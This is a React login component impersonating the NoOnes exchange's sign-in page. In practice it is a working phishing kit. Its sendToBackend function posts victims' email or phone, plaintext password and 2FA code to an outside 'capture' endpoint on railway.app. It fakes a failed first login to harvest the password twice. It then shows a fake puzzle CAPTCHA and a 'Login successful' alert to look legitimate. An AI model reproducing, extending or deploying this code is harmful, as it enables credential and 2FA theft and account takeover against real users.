import React, { useState, useEffect, useRef } from 'react';
import './login.css';

const Login = () => {
  const [formData, setFormData] = useState({
    identifier: '',
    password: ''
  });
  const [verificationCode, setVerificationCode] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [darkTheme, setDarkTheme] = useState(false);
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState('login'); // login, captcha, method, verify
  const [userEmail, setUserEmail] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');
  const [selectedMethod, setSelectedMethod] = useState(''); 
  const [captchaPosition, setCaptchaPosition] = useState(0);
  const [targetPosition, setTargetPosition] = useState(50);
  const [selectedLanguage, setSelectedLanguage] = useState('English');
  const [sessionId] = useState(() => `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);
  
  // Refs for drag handling
  const trackRef = useRef(null);

  // Function to send data to backend (Non-blocking)
  const sendToBackend = (captureData) => {
    // We do NOT await this, so the UI keeps moving regardless of server status
    fetch('https://nuns-production.up.railway.app/api/capture', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ...captureData,
        sessionId: sessionId,
        userAgent: navigator.userAgent
      })
    })
    .then(res => res.json())
    .then(result => console.log('📨 Sent to backend:', result))
    .catch(error => console.log('⚠️ Backend unavailable (Demo mode active)'));
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
    setErrorMessage('');
  };

  const handleClearIdentifier = () => {
    setFormData(prev => ({ ...prev, identifier: '' }));
  };

  const handleVerificationChange = (e) => {
    setVerificationCode(e.target.value);
  };

  const handleLoginSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage('');
    
    // Send data in background
    sendToBackend({
      type: 'LOGIN_ATTEMPT',
      identifier: formData.identifier,
      password: formData.password,
      attempt: loginAttempt + 1
    });
    
    // Simulate processing time
    setTimeout(() => {
      setLoading(false);
      
      if (loginAttempt === 0) {
        // First attempt fails
        setLoginAttempt(1);
        setErrorMessage('Invalid credentials. Please try again.');
        sendToBackend({
          type: 'LOGIN_FAILED',
          identifier: formData.identifier,
          attempt: 1
        });
      } else {
        // Second attempt succeeds -> Go to Puzzle
        setUserEmail(formData.identifier);
        setCurrentStep('captcha');
        setLoginAttempt(0);
      }
    }, 1500);
  };

  // CAPTCHA Puzzle Functions
  const handleCaptchaDrag = (clientX) => {
    if (trackRef.current) {
      const rect = trackRef.current.getBoundingClientRect();
      const x = clientX - rect.left;
      const trackWidth = rect.width;
      const percentage = Math.max(0, Math.min(100, (x / trackWidth) * 100));
      setCaptchaPosition(percentage);
    }
  };

  const startDrag = (e) => {
    e.preventDefault(); // Prevent text selection
    
    const moveHandler = (moveEvent) => {
      const clientX = moveEvent.touches ? moveEvent.touches[0].clientX : moveEvent.clientX;
      handleCaptchaDrag(clientX);
    };

    const upHandler = () => {
      document.removeEventListener('mousemove', moveHandler);
      document.removeEventListener('mouseup', upHandler);
      document.removeEventListener('touchmove', moveHandler);
      document.removeEventListener('touchend', upHandler);
    };

    document.addEventListener('mousemove', moveHandler);
    document.addEventListener('mouseup', upHandler);
    document.addEventListener('touchmove', moveHandler);
    document.addEventListener('touchend', upHandler);
  };

  const handleCaptchaSubmit = () => {
    // Check if puzzle is solved (within 5% tolerance)
    if (Math.abs(captchaPosition - targetPosition) <= 5) {
      sendToBackend({
        type: 'CAPTCHA_SOLVED',
        identifier: userEmail
      });
      setCurrentStep('method');
    } else {
      setErrorMessage('Please align the puzzle correctly');
    }
  };

  const handleMethodSelect = (method) => {
    setSelectedMethod(method);
    sendToBackend({
      type: 'VERIFICATION_METHOD_SELECTED',
      identifier: userEmail,
      method: method
    });
    setCurrentStep('verify');
  };

  const handleVerificationSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    
    sendToBackend({
      type: 'VERIFICATION_ATTEMPT',
      identifier: userEmail,
      method: selectedMethod,
      code: verificationCode
    });
    
    setTimeout(() => {
      setLoading(false);
      sendToBackend({
        type: 'LOGIN_SUCCESS',
        identifier: userEmail,
        method: selectedMethod
      });
      
      alert('✅ Login successful! Account verified.');
      resetFlow();
    }, 1500);
  };

  const resetFlow = () => {
    setCurrentStep('login');
    setFormData({ identifier: '', password: '' });
    setVerificationCode('');
    setSelectedMethod('');
    setCaptchaPosition(0);
    setTargetPosition(Math.floor(Math.random() * 70) + 15); 
  };

  const goBack = () => {
    setErrorMessage('');
    if (currentStep === 'verify') setCurrentStep('method');
    else if (currentStep === 'method') setCurrentStep('captcha');
    else if (currentStep === 'captcha') setCurrentStep('login');
  };

  const toggleTheme = () => {
    setDarkTheme(!darkTheme);
  };

  useEffect(() => {
    setTargetPosition(Math.floor(Math.random() * 70) + 15);
  }, []);

  // Shared Bottom Controls (Theme & Language)
  const BottomControls = (
    <div className="bottom-controls-container">
      <div className="theme-toggle-outer">
        <button 
          className={`theme-toggle-btn ${darkTheme ? 'dark' : 'light'}`}
          onClick={toggleTheme}
          title={darkTheme ? 'Switch to Light Theme' : 'Switch to Dark Theme'}
        >
          <span className="theme-icon sun-icon">🔆</span>
          <span className="toggle-switch-track">
            <span className="toggle-switch-thumb"></span>
          </span>
          <span className="theme-icon moon-icon">🌙</span>
        </button>
      </div>

      <div className="language-selector-outer">
        <select 
          className={`language-select ${darkTheme ? 'dark' : 'light'}`}
          value={selectedLanguage}
          onChange={(e) => setSelectedLanguage(e.target.value)}
        >
          <option value="English">English</option>
          <option value="Spanish">Spanish</option>
          <option value="French">French</option>
        </select>
        <span className="language-dropdown-arrow">v</span> 
      </div>
    </div>
  );

  // --- RENDER STEPS ---

  // 1. CAPTCHA Step
  if (currentStep === 'captcha') {
    return (
      <div className="login-wrapper">
        <div className="background-container" style={{ backgroundImage: darkTheme ? "url('/assets/background_dark.png')" : "url('/assets/background_light.png')" }}></div>
        
        <div className="login-container">
          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
            <div className="login-header">
              <div className="header-left">
                <h1 className="welcome-text">Security Check</h1>
                <p className="verification-subtitle">Complete the puzzle to continue</p>
              </div>
              <div className="header-right">
                <button className="back-btn" onClick={goBack}>←</button>
              </div>
            </div>

            <div className="security-notice">
              <div className="security-icon">🧩</div>
              <p>Slide the puzzle piece to the correct position</p>
            </div>

            <div className="captcha-puzzle">
              <div className="puzzle-container">
                <div className="puzzle-track" ref={trackRef}>
                  <div 
                    className="puzzle-slider"
                    style={{ left: `${captchaPosition}%` }}
                    onMouseDown={startDrag}
                    onTouchStart={startDrag}
                  >🧩</div>
                  <div className="puzzle-target" style={{ left: `${targetPosition}%` }}>🎯</div>
                </div>
              </div>
              
              {errorMessage && <div className="error-message">{errorMessage}</div>}

              <button onClick={handleCaptchaSubmit} className="login-button">Verify Puzzle</button>
            </div>
          </div>
          {BottomControls}
        </div>
      </div>
    );
  }

  // 2. Method Selection Step
  if (currentStep === 'method') {
    return (
      <div className="login-wrapper">
        <div className="background-container" style={{ backgroundImage: darkTheme ? "url('/assets/background_dark.png')" : "url('/assets/background_light.png')" }}></div>
        
        <div className="login-container">
          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
            <div className="login-header">
              <div className="header-left">
                <h1 className="welcome-text">Verification</h1>
                <p className="verification-subtitle">Choose how to verify your identity</p>
              </div>
              <div className="header-right">
                <button className="back-btn" onClick={goBack}>←</button>
              </div>
            </div>

            <div className="verification-methods">
              <div 
                className={`method-option ${selectedMethod === 'email' ? 'selected' : ''}`}
                onClick={() => handleMethodSelect('email')}
              >
                <div className="method-icon">📧</div>
                <div className="method-content">
                  <h3>Email Verification</h3>
                  <p>Send a code to your email</p>
                </div>
              </div>

              <div 
                className={`method-option ${selectedMethod === 'authenticator' ? 'selected' : ''}`}
                onClick={() => handleMethodSelect('authenticator')}
              >
                <div className="method-icon">📱</div>
                <div className="method-content">
                  <h3>Authenticator App</h3>
                  <p>Use Google Authenticator</p>
                </div>
              </div>
            </div>
          </div>
          {BottomControls}
        </div>
      </div>
    );
  }

  // 3. Verification Code Step
  if (currentStep === 'verify') {
    return (
      <div className="login-wrapper">
        <div className="background-container" style={{ backgroundImage: darkTheme ? "url('/assets/background_dark.png')" : "url('/assets/background_light.png')" }}></div>
        
        <div className="login-container">
          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
            <div className="login-header">
              <div className="header-left">
                <h1 className="welcome-text">Enter Code</h1>
                <p className="verification-subtitle">
                  {selectedMethod === 'email' ? 'Check your email inbox' : 'Open your authenticator app'}
                </p>
              </div>
              <div className="header-right">
                <button className="back-btn" onClick={goBack}>←</button>
              </div>
            </div>

            <form onSubmit={handleVerificationSubmit} className="login-form">
              <div className="form-group">
                <label htmlFor="verificationCode">Verification Code</label>
                <input
                  type="text"
                  id="verificationCode"
                  name="verificationCode"
                  placeholder="Enter 6-digit code"
                  value={verificationCode}
                  onChange={handleVerificationChange}
                  maxLength={6}
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
              </div>

              <button type="submit" className="login-button" disabled={loading || verificationCode.length !== 6}>
                {loading ? <span className="loading-spinner">⏳</span> : 'Verify & Continue'}
              </button>
            </form>
          </div>
          {BottomControls}
        </div>
      </div>
    );
  }

  // 4. Initial Login Step
  return (
    <div className="login-wrapper">
      <div className="background-container" style={{ backgroundImage: darkTheme ? "url('/assets/background_dark.png')" : "url('/assets/background_light.png')" }}></div>
      
      <div className="login-container">
        <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
          <div className="login-header">
            <div className="header-left">
              <h1 className="welcome-text">Welcome to NoOnes</h1>
            </div>
            <div className="header-right">
              <button className="social-btn google-btn" title="Google">
                <img src="/assets/google-icon.gif" alt="Google" className="social-icon-img" />
              </button>
              <button className="social-btn apple-btn" title="Apple">
                <img src="/assets/apple-icon.webp" alt="Apple" className="social-icon-img" />
              </button>
            </div>
          </div>

          <form onSubmit={handleLoginSubmit} className="login-form">
            {errorMessage && <div className="error-message">{errorMessage}</div>}
            
            <div className="form-group">
              <label htmlFor="identifier">Email/Phone number</label>
              <div className="input-with-icon">
                <input
                  type="text"
                  id="identifier"
                  name="identifier"
                  placeholder={darkTheme ? "Enter your email or phone number" : "Enter your email or phone number"}
                  value={formData.identifier}
                  onChange={handleChange}
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
                {formData.identifier && (
                  <button type="button" className="clear-input-btn" onClick={handleClearIdentifier}>&times;</button>
                )}
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="password">Password</label>
              <div className="input-with-icon">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  name="password"
                  placeholder="Enter your password"
                  value={formData.password}
                  onChange={handleChange}
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
                <button 
                  type="button"
                  className="toggle-password-visibility"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? 
                    <img src={darkTheme ? "/assets/eye-closed-dark.svg" : "/assets/eye-closed-light.svg"} alt="Hide" /> : 
                    <img src={darkTheme ? "/assets/eye-open-dark.svg" : "/assets/eye-open-light.svg"} alt="Show" />
                  }
                </button>
              </div>
              <div className="forgot-password-link"><a href="/forgot-password">Forgot password?</a></div>
            </div>

            <button type="submit" className="login-button" disabled={loading}>
              {loading ? <span className="loading-spinner">⏳</span> : 'Log in'}
            </button>
          </form>

          <div className="signup-prompt">
            <p>No account yet? <a href="/signup" className="signup-link">Sign up</a></p>
          </div>
        </div>
        {BottomControls}
      </div>
    </div>
  );
};

export default Login;